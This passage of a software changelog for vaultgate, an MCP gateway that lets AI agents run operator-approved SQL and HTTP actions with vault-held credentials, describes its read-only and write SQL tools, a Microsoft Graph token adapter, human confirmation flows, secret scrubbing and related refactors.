  the host name kept for TLS (SNI and certificate verification, `verify-full` against a
  `ca_pem`; there is no way to skip verification), and closed in `finally` — no pool, so a
  rotated password takes effect on the next call. PostgreSQL sessions are opened read-only
  (`SET default_transaction_read_only = on` and `BEGIN READ ONLY`); on SQL Server the
  classification and the least-privilege login are the controls, and the guide says so. The
  result carries the columns with the engine's own type names, the rows as arrays of JSON
  scalars (ISO 8601 dates, base64 binary, decimals and 64-bit integers as strings), the row
  count, `truncated` and `duration_ms`; rows are dropped whole at `max_rows` and at
  `max_output_bytes`, so no value is ever cut in half. Driver failures map to
  `authentication_failed`, `connection_failed`, `tls_error`, `timeout` and `upstream_error` with
  the server's message scrubbed and capped at 1 KiB. Contract tests run the connector against
  fake sessions and both real session modules against fake drivers, with the ACT-77 corpus as
  one named test per statement per engine, the ACT-53 canary suite through the engine and a
  parameterised query through the MCP client SDK.
  Operator guide: `docs/guides/actions.md` ("Creating a `sql` target", "Calling a `sql` target",
  with the `CREATE ROLE`/`CREATE LOGIN` examples); tool reference:
  `docs/guides/tools-and-scopes.md`.
- `sql_execute` under `actions:sql.write` (spec 13 §13.6.4 and spec 14 §14.4, M11 second pull
  request; ACT-25, ACT-38, ACT-40, ACT-41, ACT-45…49, ACT-76): the tool is listed for tokens
  holding `actions:sql.write` on a deployment with `VAULTGATE_ACTIONS_ENABLE_SQL=true`, and a
  target serves it only when its policy's `operations` include `write`. It takes the same
  arguments as `sql_query` and is judged by the same tokeniser and classifier, but accepts the
  opposite classes: `dml` always, `ddl` only when `write_classes` names it, and a `read`
  statement never — so neither tool can be made to do the other's work whatever scopes the token
  holds. A target carrying a `statement_allowlist` then has it applied as ACT-34 `command`-kind
  patterns over the statement as the agent wrote it, refusing anything outside with
  `policy_denied` and `detail.reason: "statement_pattern"`. Every call is a non-read call, so a
  target with `confirm_writes` (the default for a new target) obtains a human confirmation
  through MCP elicitation before the credential is fetched or anything connects. The statement
  runs in its own transaction — `BEGIN`/`COMMIT` on PostgreSQL, the driver's transaction on SQL
  Server — rolled back on any error, and on the policy timeout the connection is dropped, which
  rolls it back too. The result is `rows_affected`, the `columns` and `rows` the statement
  returned through `RETURNING` or `OUTPUT` (both empty when it returned none, so the shape does
  not change with the statement), `truncated` and `duration_ms`. `actions_list_targets` now
  reports `write` for a target whose policy allows it and whose caller holds the scope.
  The confirmation flow is proven end to end through the real MCP client SDK for this tool:
  accept, accept without the box ticked, decline, cancel, a client that cannot elicit, a replayed
  confirmation, an expired one, an edited target, altered arguments and another token.
  Operator guide: `docs/guides/actions.md` ("Changing data through a `sql` target", with the
  least-privilege write-login examples for both engines).

### Changed

- **Specification 13 is split in two.** `docs/spec/13-actions.md` keeps 13.1 to 13.9 — what a
  target is, who may use it, the tools, the policy, the confirmation and the secret handling —
  and the new `docs/spec/13a-actions-operations.md` holds 13.10 to 13.18: the network rules, the
  limits, the audit trail, the storage, the configuration, the module layout, the error codes,
  the non-goals and the verification. The section numbers and the `ACT-n` identifiers are
  unchanged, so every existing citation still resolves; the seam is the one between the layer's
  contract and its operation, and the file had reached the repository's 64 KiB size gate.
- `Connector.authorize` and `Connector.describe` now take one `OperationRequest` — the target's
  three documents and the tool the agent called — instead of a list of documents. A connector
  that serves two tools needs the name to judge an operation at all, and this supersedes the
  appended `destination` parameter added in M11's first pull request.
- `RunContext` carries the tool name, so the `sql` connector opens a read-only or a
  transactional session and returns the ACT-24 or the ACT-25 result accordingly.
- `ConnectorOutput` gains an optional `bytes`, so a connector whose result is not a byte
  stream (the `sql` rows) still reports `output_bytes` to the `action_calls` row.
- The `action_calls` classification is recorded for a call the policy refused, not only for a
  call that ran (ACT-26, ACT-60), so an operator reading a target's history sees what a refused
  statement was taken to be.
- `policy.schemas` is withdrawn from the `sql` policy document (spec 14 §14.4). Deciding whether
  a qualified name in a statement is a schema or a table alias needs a real parser; a check that
  cannot tell them apart either refuses ordinary statements or gives a false assurance. Granting
  the login only the schemas you mean is the control, and the guide now shows how for both
  engines. A stored `schemas` value is ignored rather than invalidating the target.
- The certificate and TLS error codes are classified in one place (`src/net/tls-error.ts`) for
  the pinned HTTPS transport and the database drivers alike, instead of once per connector.
- The measured cost of the `sql` drivers is recorded in the specification itself (ACT-84), not
  only in a pull-request body: `pg` and everything it needs is 14 packages and about 0.9 MB;
  `mssql` adds 73 packages and about 69 MB, of which about 44 MB is the `@azure/*` tree that
  `tedious` requires at module load for Entra ID authentication modes vaultgate never uses.

### Dependencies

- Added `pg` 8.23.0 and `mssql` 12.7.2 (ACT-84, QG-9), each imported only from inside its own
  session module through a dynamic import, so a deployment that never enables `sql` never loads
  either. Both are pure JavaScript with no native addon and no install script; `pg-native` is an
  optional peer dependency and is not installed. Added `@types/pg` 8.23.1 and `@types/mssql`
  12.3.0 as development dependencies (type declarations only; neither ships).

### Fixed

- The account page's `graph` credential fields still carried the pre-M10 help text, telling the
  operator that "a graph target cannot be saved until the graph adapter arrives in M10" on the
  very release that ships the adapter. The help now describes the tenant field and keeps the
  base-URL rule. Found by the M10 live test against the reference deployment.

- A call the policy refuses is now covered by a test asserting it is recorded with the
  classification it was refused for (ACT-26, ACT-60), so the operator can see what was asked for.
  The behaviour arrived with the `sql` connector, which moved the connector's `describe` ahead of
  its `authorize`; nothing asserted it, and the release before it recorded a blank classification
  on every refusal.
- The operator guide says that a target's vault item must be one vaultgate has already synced,
  since a freshly created item is refused until the next scheduled sync.

## [0.1.0-rc.7] - 2026-09-23

### Added

- `graph` credential adapter for `http` targets (spec 14 §14.3, M10; ACT-81, ACT-82, ACT-83): a
  target whose `base_url` is on `https://graph.microsoft.com` may map its credential as
  `mode: "graph"`, and `http_request` then behaves exactly as it does on a bearer target while
  vaultgate obtains the Microsoft Graph access token itself. The adapter document names the
  tenant (a GUID or a domain name), the application id, the grant (`client_credentials` or
  `refresh_token`), the scope and the vault fields holding the client secret and, for the
  refresh grant, the refresh token; the M9 save-time refusal of the mode is gone and a `graph`
  mapping is checked like any other (ACT-4). Before the request the adapter posts the grant to
  `https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token` through the pinned transport,
  resolving and validating that host by the same private-range rule as any destination, and
  validates the response against a schema before reading a field. The token is held in process
  memory only, keyed by target id and revision and given up 60 s before it expires (the one
  caching exception of ACT-50); it is never stored, never logged, and is redacted from every
  result, row, log line and elicitation message as `[redacted:graph.access_token]`, in every
  ACT-51 encoding. A `401` from Graph discards it and the request is retried once with a fresh
  token; a `401` on that attempt is the result. When the token endpoint rotates the refresh
  token, the new one is written back to the mapped vault field **before** the Graph request and
  an `actions.credential_rotated` event is recorded (target, item id, field name, never the
  value); a write-back that fails fails the call with `credential_rotation_failed` so the
  operator learns while the old token still works. Token-endpoint failures map to
  `authentication_failed` for `invalid_client` and `invalid_grant` (the OAuth error code is the
  only detail; the AADSTS description is not scrub-safe), to `connection_failed`, `tls_error`
  or `timeout` for a transport failure, and to `upstream_error` otherwise. Contract tests cover
  both grants, the cache and its 60 s margin, a revision change, the `401` retry and the
  absence of a loop, rotation and a failed write-back, every error mapping, and an ACT-53 canary
  suite through the engine in which the fake Graph echoes the `Authorization` header and the
  fake token endpoint echoes the form it was posted. Operator guide: `docs/guides/actions.md`
  ("Microsoft Graph targets").

### Changed

- `VaultClient.updateItem` can write custom fields (`ItemPatch.customFields`): a named field
  keeps its kind and takes the new value, a name the item does not carry is created `hidden`.
  This is what the ACT-83 refresh-token write-back uses; it is the only path by which the
  actions layer writes to the vault, and it needs no agent scope.

### Fixed

- The account page's create-target form carried no `connector` field, while `POST /account/actions`
  reads the connector from the submission, so creating a target from a browser answered `404` and
  no target could be created through the operator pages at all (spec 13 §13.3.2, ACT-2, ACT-6).
  The create form now carries the connector as a hidden field, and the create-page test submits
  exactly the controls the rendered form carries rather than a hand-written field set, so a field
  the form forgets to render fails the suite. Found by the M9 live test against both reference
  deployments on v0.1.0-rc.6.

## [0.1.0-rc.6] - 2026-09-23

### Added

- `http` connector runtime and `http_request` (spec 14 §14.2 and spec 13 §13.6.3, M9 fourth pull
  request; ACT-20, ACT-21, ACT-22, ACT-79, ACT-80): the tool is listed on a deployment with
  `VAULTGATE_ENABLE_ACTIONS=true` and `VAULTGATE_ACTIONS_ENABLE_HTTP=true` for tokens holding
  `actions:http`. An `http_request` names a granted target and gives a method, a path with an
  optional query string, up to 32 headers and a string or JSON body; the policy decision is pure
  (method, normalised path and query against `allowed_paths`, header allowlist with
  `Authorization`, `Cookie`, `Host`, `Content-Length`, `User-Agent`, `Transfer-Encoding`,
  `Proxy-*` and the credential's own header always refused, body size), the credential is placed
  by its mapping (`bearer`, `basic`, `header` with a prefix, or `query` URL-encoded after the
  agent's query and only with `allow_query_credentials`), and the request goes through the
  pinned transport with `User-Agent: vaultgate/<version>`, the policy timeout and a body read
  capped at `max_output_bytes` plus the scrub guard band. Redirects are returned as results
  unless `follow_redirects` is on, then at most two hops and only under `base_url` (the same
  origin, so the same pinned address, never a second resolution), with Fetch's method rules.
  The result carries the status, the policy's response headers, the body as text or as base64
  (`body_encoding`) when the media type is not textual or the bytes are not UTF-8, the bytes
  received, `truncated` and `duration_ms`; a non-2xx status, `401` included, is a normal result,
  and only an unreachable destination is an error (`connection_failed`, `tls_error`, `timeout`,
  `destination_refused`, with the error code as the only detail). Contract tests run the
  connector against a fake transport for every policy reason, error code, redirect case, the cap
  with a value straddling the cut, the timeout and each injection mode, plus the ACT-53 canary
  suite through the engine and a confirmed `POST` through the MCP client SDK. A `graph` mapping
  is refused at save with "the graph adapter arrives in M10", and a stored target is validated
  against the connector's save-time rules again on read, so no half-implemented mode can run.
  Operator guide: `docs/guides/actions.md` ("Calling an `http` target"); tool reference:
  `docs/guides/tools-and-scopes.md`.
- Account-page Actions section (spec 13 §13.3.2, M9 third pull request; ACT-5, ACT-6, ACT-8,
  ACT-9, ACT-49, ACT-62, ACT-63 basic): present only with `VAULTGATE_ENABLE_ACTIONS=true`, it
  lists every target with its connector, destination summary, state (a stored row that fails its
  schema is marked `target_invalid` with the reason, ACT-1), grants, last call and open sessions,
  and links to a page per target and to a create form per connector. The forms are drawn from
  per-connector field descriptors over the connector's zod schemas (`http` now: base URL,
  `internal`, the vault item id with its name shown once saved, the injection mode and its
  fields including the `graph` adapter document, the policy allowlists one pattern per line, the
  common limits with their defaults and ceilings; `confirm_writes` is on for every new target);
  a rejected save re-renders with every problem and the submitted values. Edit, enable,
  disable, delete, grant management among the clients holding a consent, "close sessions" and
  the last 50 calls live on the target's page; every write is `POST /account/actions/*` behind
  the ID-18 checks and the five-minute re-authentication window, and every change goes through
  the targets service so its `actions.*` event is recorded (`sessions_closed` is new). The
  account-page audit export offers the `actions` stream beside `audit`. Operator guide:
  `docs/guides/actions.md`.

- Actions engine core (spec 13, M9 first pull request; ACT-1…ACT-74 as far as the engine
  enforces them), off by default behind `VAULTGATE_ENABLE_ACTIONS` with one switch per connector
  (`VAULTGATE_ACTIONS_ENABLE_{HTTP,SQL,SSH,WINRM,BROWSER}`, `VAULTGATE_ACTIONS_BROWSER_CDP_URL`,
  `VAULTGATE_ACTIONS_ALLOW_ANY_COMMAND`; a connector switch without the master switch is a
  start-up warning): the six `actions:*` scopes in the registry, advertised and effective only
  when the layer and the connector are on, with the consent-page group and its warning lines;
  migration `004-actions` (`action_targets`, `action_grants`, `action_calls`, `action_sessions`)
  and the maintenance rules that close expired sessions as `idle` and retire calls past audit
  retention; the targets service (create, edit, enable, disable, delete, grant, revoke, consent
  revocation callback) with save-time destination resolution, vault item and field checks and
  `actions.*` audit events; the glob-like policy matcher and HTTP subject normalisation; the
  confirmation `requestState` (HKDF-derived HMAC, 120 s, single-use nonce) and the ACT-42
  elicitation document; the scrubber over every encoded variant with the guard band; per-target
  and per-client limits; the engine (`createActionsEngine`: `listTargets`, `call`) with the
  ACT-16 order, one error code per failure and one `action_calls` row plus one audit event per
  call; `node dist/cli.js audit export --stream actions`; the dependency-cruiser rules for the
  `actions` layer; and the `http` connector's document schemas (including the `graph` adapter
  document). No MCP tool, account page or connector runtime yet: those are the next pull
  requests. Test support gains an echo connector whose fake destination returns its request, so
  the canary suite proves end to end that no injected value, in any encoding, reaches a result,
  an audit row, a log line or an elicitation message.
- Actions MCP surface (spec 13 §13.6 and §13.8, M9 second pull request): `actions_list_targets`
  (ACT-19) and the generic registration every connector tool uses. A connector declares each of
  its tools (name, scope, LLM-facing description, the 13.6.1 annotations, operation schema and
  strict result schema) on its `Connector`; `src/mcp/tools/actions.ts` advertises the tools of
  the loaded connectors with `target` first and dispatches every call to the engine, which
  records the one MCP-13 event itself. `tools/list` shows an actions tool only to a token whose
  effective scopes reach it, so a `vault:read`-only token sees none; `actions_list_targets`
  opens to any enabled `actions:*` scope and its OAUTH-33 challenge lists them all as one
  any-of set. `ToolAnnotations.openWorldHint` is a boolean (ACT-18). On the 2026-07-28 wire a
  confirmed target answers a form-capable client with the ACT-42 elicitation document as the
  SDK's `input_required` result and honours the retried answer (ACT-45…47); a client that
  declares no form-mode elicitation is refused with the fixed ACT-48 message before anything
  else happens, and a 2025-wire client counts as one until M14's in-band fallback. Revoking a
  client's consent on the account page now revokes its grants and closes its sessions (ACT-10)
  through a callback the composition layer wires into the authorization server. No connector
  runtime yet: `http_request` is declared by the `http` connector when it lands, so no
  connector tool is listed on any deployment until then.

### Changed

- The pinned transport (`src/net/pinned-https.ts`) serves every method, a request body, and
  plain `http://` through `node:http` beside `https://`, still connecting only to the address the
  caller validated; `createPinnedHttpsFetch` takes `{ https, http }` request functions and
  `readBodyCapped` reads a response up to a limit and cancels the rest. The CIMD fetcher's
  behaviour is unchanged.
- The connector interface's `authorize` receives the credential document as a third argument,
  so a connector can refuse the header its mapping injects (ACT-22). `validateTarget` runs the
  connector's pure save-time problems again on read (ACT-1), marking such a row `invalid`.
- One version source: `src/version.ts` reads `package.json`, and both the MCP `initialize`
  response (previously a hand-kept `0.1.0`) and the actions `User-Agent` report it.
- One in-memory limiter module, `src/net/rate-limit.ts`, serves the authorization server, the
  MCP endpoint and the actions engine; `src/oauth/rate-limit.ts` and `src/mcp/rate-limit.ts` are
  gone. A token bucket now remembers the budget it was taken under, so a key with its own limit
  (a target's `rate_limit_per_minute`) is never judged full against the limiter's default.
- `src/oauth/ip-ranges.ts` moved to `src/net/ip-ranges.ts` and gained `classifyAddress`
  (`public`, `private`, `forbidden`, `invalid`) and the `Lookup` type; `isPublicAddress` and the
  CIMD fetcher are unchanged.
- The audit keyset pagination and streaming export are shared by both streams
  (`src/audit/keyset.ts`, `lineFormats`); `listAuditEvents` returns `records`.
- `parseSecretField` lives in `src/vault/fields.ts` with the field-presence check ACT-4 needs;
  `deriveKey` is exported from `src/crypto/secret-box.ts` for the confirmation HMAC purpose.

### Docs

- ADR 0007 and spec sections 13 (Actions) and 14 (Action connectors) specify a planned,
  off-by-default actions layer: operator-defined targets, six `actions:*` scopes, typed tools
  (`http_request` with a Microsoft Graph adapter, `sql_query`/`sql_execute`, `ssh_run`,
  `winrm_run`, `browser_*` over a Chromium sidecar), operator allowlist policy, MCP tool
  annotations, per-call confirmation through MCP elicitation, scrubbing of every injected value,
  `action_*` tables and audit. ADR 0004 is marked amended by 0007; the threat model gains
  T24…T34 and the residual risks of the layer; `PLAN.md` gains M9…M15 with exit criteria; the
  tools guide, README and section 01 principle 3 note the layer as planned. No code changes.

### Fixed

- VAULT-16: a `bw serve` call that vaultgate aborted at the 60 s bound carried the same message
  as a refused or reset connection (`the vault is locked or not reachable`), so a `vault backend
  start failed` line could not say whether the child had stalled or was gone. The abort now reads
  `the vault did not answer within 60 s`; the code is still `vault_unavailable`. Spec VAULT-6
  states that a `/unlock` which is refused, reset or times out is a failed attempt, restarted on
  the same generation without a second login.
- Integration suite: the readiness wait gave up silently at 90 s, so a first `/unlock` that hit the
  VAULT-16 bound (the restart a second later was ready) failed `VAULT-4 VAULT-5` with
  `expected false to be true` while the rest of the suite passed. The wait now covers one failed
  attempt and a clean restart (150 s, `hookTimeout` 180 s), fails the hook with the reason, and the
  supervisor logs at `info` so a run shows when the CLI logged in, synced and became ready.

## Earlier releases

Release candidates 0.1.0-rc.1 to 0.1.0-rc.5 are in
[`docs/changelog-archive.md`](docs/changelog-archive.md). They are kept verbatim; this file holds
the current release and the ones after it, so it stays inside the repository's 64 KiB file gate.

[Unreleased]: https://github.com/adamrowles1996/vaultgate/compare/v0.1.0-rc.14...HEAD
[0.1.0-rc.14]: https://github.com/adamrowles1996/vaultgate/compare/v0.1.0-rc.13...v0.1.0-rc.14
[0.1.0-rc.13]: https://github.com/adamrowles1996/vaultgate/compare/v0.1.0-rc.12...v0.1.0-rc.13
[0.1.0-rc.12]: https://github.com/adamrowles1996/vaultgate/compare/v0.1.0-rc.11...v0.1.0-rc.12
[0.1.0-rc.11]: https://github.com/adamrowles1996/vaultgate/compare/v0.1.0-rc.10...v0.1.0-rc.11
[0.1.0-rc.10]: https://github.com/adamrowles1996/vaultgate/compare/v0.1.0-rc.9...v0.1.0-rc.10
[0.1.0-rc.9]: https://github.com/adamrowles1996/vaultgate/compare/v0.1.0-rc.8...v0.1.0-rc.9
[0.1.0-rc.8]: https://github.com/adamrowles1996/vaultgate/compare/v0.1.0-rc.7...v0.1.0-rc.8
[0.1.0-rc.7]: https://github.com/adamrowles1996/vaultgate/compare/v0.1.0-rc.6...v0.1.0-rc.7
[0.1.0-rc.6]: https://github.com/adamrowles1996/vaultgate/compare/v0.1.0-rc.5...v0.1.0-rc.6
